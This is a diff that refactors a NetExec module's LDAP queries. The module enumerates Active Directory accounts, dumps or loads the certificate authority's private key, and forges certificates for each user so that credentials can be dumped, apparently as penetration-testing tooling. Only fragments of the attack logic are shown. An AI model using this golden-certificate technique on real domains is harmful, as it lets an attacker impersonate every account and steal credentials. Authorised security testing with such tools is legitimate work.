@@ -1,20 +1,21 @@
 import datetime as dt
 import os
+import socket
 
 from cryptography import x509
+from cryptography.x509.oid import NameOID
 from impacket.dcerpc.v5 import rpcrt, scmr
-from ldap3.protocol.formatters.formatters import format_sid
 
 from certipy.commands.auth import Authenticate
 from certipy.commands.ca import CA
 from certipy.commands.forge import Forge
 from certipy.lib.certificate import cert_id_to_parts, create_pfx, generate_rsa_key, get_identities_from_certificate, get_object_sid_from_certificate, get_subject_from_str, load_pfx
-from certipy.lib.ldap import LDAPConnection
 from certipy.lib.rpc import get_dce_rpc
 from certipy.lib.target import DnsResolver, Target
 
 from nxc.helpers.misc import CATEGORY
 from nxc.helpers.path import sanitize_path_component
+from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.paths import NXC_PATH
 
 
@@ -41,22 +42,14 @@ class NXCModule:
         self.enabled = module_options.get("ENABLED", "").lower() in ("true", "1", "yes")
 
     def on_login(self, context, connection):
-        target = self.make_target(connection)
-        ldap_conn = LDAPConnection(target=target)
-        try:
-            ldap_conn.connect()
-        except Exception as e:
-            context.log.fail(f"LDAP connection failed: {e}")
-            return
-
         self.domain = connection.domain
-        users = self.enum_users(ldap_conn)
+        users = self.enum_users(connection)
         if not users:
             context.log.fail(f"No users found{f' matching {self.user}' if self.user else ''}")
             return
         context.log.display(f"Found {len(users)} user(s) in LDAP")
 
-        ca_key, ca_cert = self.load_ca(context, connection, ldap_conn)
+        ca_key, ca_cert = self.load_ca(context, connection)
         if ca_key is None or ca_cert is None:
             return  # load_ca already logged the specific reason
 
@@ -69,6 +62,7 @@ class NXCModule:
         crl = parse_result_attributes(connection.search(f"(&(objectClass=cRLDistributionPoint)(name={ca_cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value}))", ["distinguishedName"], baseDN=f"CN=CDP,CN=Public Key Services,CN=Services,{connection.configuration_context}"))
         forger = Forge(crl=crl[0]["distinguishedName"] if crl else None)
         user_key = generate_rsa_key(2048)  # one throwaway key reused for every account: the keygen is the slow part
+        target = self.make_target(connection)
         dumped = added = 0
         with open(outfile, "w") as results:
             for sam, sid in users:
@@ -112,24 +106,19 @@ class NXCModule:
             ldap_scheme="ldaps" if connection.port == 636 else "ldap",
         )
 
-    def enum_users(self, ldap_conn):
+    def enum_users(self, connection):
         user_filter = (
             "(&(objectClass=user)(|(objectCategory=person)(objectClass=computer))"
             + (f"(sAMAccountName={self.user})" if self.user else "")
             + (self.DISABLED_ACCOUNT_FILTER if self.enabled else "")
             + ")"
         )
-        users = []
-        for entry in ldap_conn.search(search_filter=user_filter, attributes=["objectSid", "sAMAccountName"]):
-            raw_sid = entry.get_raw("objectSid")
-            sam = entry.get("sAMAccountName")
-            if raw_sid and sam:
-                users.append((sam, format_sid(raw_sid[0])))
-        return users
+        results = parse_result_attributes(connection.search(user_filter, ["objectSid", "sAMAccountName"]))
+        return [(entry["sAMAccountName"], entry["objectSid"]) for entry in results if entry.get("objectSid") and entry.get("sAMAccountName")]
 
-    def load_ca(self, context, connection, ldap_conn):
+    def load_ca(self, context, connection):
         if not self.ca_pfx:
-            return self.dump_ca_pki(context, connection, ldap_conn)
+            return self.dump_ca_pki(context, connection)
 
         ca_pass = self.ca_pfx_pass.encode() if self.ca_pfx_pass else None
         try:
@@ -141,8 +130,8 @@ class NXCModule:
         context.log.debug(f"Loaded CA certificate and private key from {self.ca_pfx}")
         return ca_key, ca_cert
 
-    def dump_ca_pki(self, context, connection, ldap_conn):
-        cas = ldap_conn.search("(&(objectClass=pKIEnrollmentService))", search_base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{ldap_conn.configuration_path}", attributes=["name", "dNSHostName"])
+    def dump_ca_pki(self, context, connection):
+        cas = parse_result_attributes(connection.search("(objectClass=pKIEnrollmentService)", ["name", "dNSHostName"], baseDN=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{connection.configuration_context}"))
         if not cas:
             context.log.fail("No certificate authority found in LDAP")
             return None, None
